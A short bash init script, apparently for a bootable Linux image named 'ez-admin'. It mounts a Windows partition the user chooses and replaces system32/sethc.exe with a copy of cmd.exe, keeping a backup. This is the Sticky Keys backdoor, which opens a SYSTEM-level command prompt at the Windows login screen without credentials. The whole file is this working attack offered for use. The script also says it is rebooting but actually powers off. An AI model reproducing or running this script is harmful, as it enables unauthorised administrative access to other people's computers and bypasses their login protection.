#!/bin/bash
echo "Performing basic initscript tasks..."
dmesg -n 1
mount -t devtmpfs none /dev
mount -t proc none /proc
mount -t sysfs none /sys
echo "Done!"
echo && echo

echo "Welcome to ez-admin!"
echo "Printing partitions. Please enter a partition to mount and run ez-admin on."
mkdir -p /mnt
fdisk -l

echo "Please enter a partition: "
read partition

echo "Mounting partition..."
mount $partition /mnt

echo "Backing up and replacing sethc.exe..."
pushd /mnt/Windows/system32
  cp sethc.exe sethc.exe.bak
  cp cmd.exe sethc.exe
popd
echo "Unmounting partition..."
umount $partition

echo "Done! Rebooting in 5 seconds..."
sleep 5
poweroff -f
